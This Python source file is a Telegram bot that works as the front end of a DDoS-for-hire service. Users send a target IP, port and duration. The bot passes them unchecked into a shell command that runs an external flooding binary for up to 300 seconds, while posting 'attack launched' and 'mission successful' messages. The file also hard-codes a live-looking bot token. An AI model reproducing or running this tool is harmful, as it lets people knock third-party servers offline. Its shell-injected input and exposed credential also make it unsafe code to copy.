import os
import telebot
import logging
import asyncio
import random
import time  # ✅ Added this to fix the error
from threading import Thread

loop = asyncio.new_event_loop()

TOKEN = "7644406036:AAFS0wPkuqfuTlnENhlDwY7HVpI2DkEmKJA"
FORWARD_CHANNEL_ID = -10022354151287

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

bot.attack_in_progress = False
bot.attack_duration = 0
bot.attack_start_time = 0
authorized_users = set()

# ✅ Fix: `time` module added ✅  
# Now, `time.time()` will work without errors.

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/Vo.jpg", "https://envs.sh/Vv.jpg", "https://envs.sh/VH.jpg",
    "https://envs.sh/Vg.jpg", "https://envs.sh/BL.bin", "https://envs.sh/Vf.jpg",
    "https://envs.sh/VO.jpg", "https://envs.sh/VM.jpg"
]

# ✅ Attack Command
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    if message.chat.type == 'private' and message.from_user.id not in authorized_users:
        bot.reply_to(message, "❗ You are **NOT AUTHORIZED!** Request access with `@ILLEGALCHEAT78`.")
        return

    if bot.attack_in_progress:
        bot.send_message(message.chat.id, "⚠️ **WAIT!** Another attack is already in progress! 🛑")
        return

    bot.send_message(message.chat.id, "💣 **READY TO NUKE?**\n"
                                      "Send **Target IP, Port, and Time (seconds).**\n"
                                      "Example: `167.67.25 6296 300` 🔥", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

# ✅ Processing Attack
def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "❗ *Bro, enter valid data!* 📌", parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"🚫 *Port {target_port} is blocked!* ❌", parse_mode='Markdown')
            return
        if duration > 300:
            bot.send_message(message.chat.id, "⏳ *Max attack time is 300 seconds!* 🚀", parse_mode='Markdown')
            return

        bot.attack_in_progress = True
        bot.attack_duration = duration
        bot.attack_start_time = time.time()  # ✅ Now, this will work fine
        bot.attack_target = target_ip  

        # 🎯 Send Random Image Before Attack Starts  
        random_image_url = random.choice(image_urls)
        bot.send_photo(message.chat.id, random_image_url, caption="🔥 **Attack is starting! Brace yourself!** 💀")

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, message.chat.id), loop)
        bot.send_message(message.chat.id, f"🚀 **Attack Launched!** 🔥\n"
                                          f"🎯 **IP:** `{target_ip}`\n"
                                          f"🎯 **Port:** `{target_port}`\n"
                                          f"⏳ **Duration:** `{duration} seconds!`", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"⚠️ *Error processing attack command!* {e}")
        bot.attack_in_progress = False

# ✅ Running Attack
async def run_attack_command_async(target_ip, target_port, duration, chat_id):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./raja {target_ip} {target_port} {duration} {1000}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await process.communicate()
        logging.info(f"Attack Output: {stdout.decode()}")
        if stderr:
            logging.error(f"Attack Error: {stderr.decode()}")

    except Exception as e:
        logging.error(f"Error during attack execution: {e}")

    finally:
        bot.attack_in_progress = False
        bot.send_message(chat_id, f"💥 **ATTACK FINISHED!** ✅\n"
                                  f"🎯 **Target:** `{target_ip}`\n"
                                  f"📡 **Port:** `{target_port}`\n"
                                  f"⏳ **Time:** `{duration} sec`\n"
                                  f"🔥 **MISSION SUCCESSFUL!**", parse_mode='Markdown')

# ✅ /when Command (Check Remaining Time)
@bot.message_handler(commands=['when'])
def handle_when_command(message):
    if not bot.attack_in_progress:
        bot.send_message(message.chat.id, "🔍 **NO ACTIVE ATTACK!** 🚀")
    else:
        elapsed_time = time.time() - bot.attack_start_time
        remaining_time = max(0, bot.attack_duration - elapsed_time)
        bot.send_message(message.chat.id, f"⏳ **TIME LEFT:** `{int(remaining_time)} sec` 🔥", parse_mode='Markdown')

# ✅ Async Thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == '__main__':
    Thread(target=start_asyncio_thread).start()
    bot.infinity_polling()

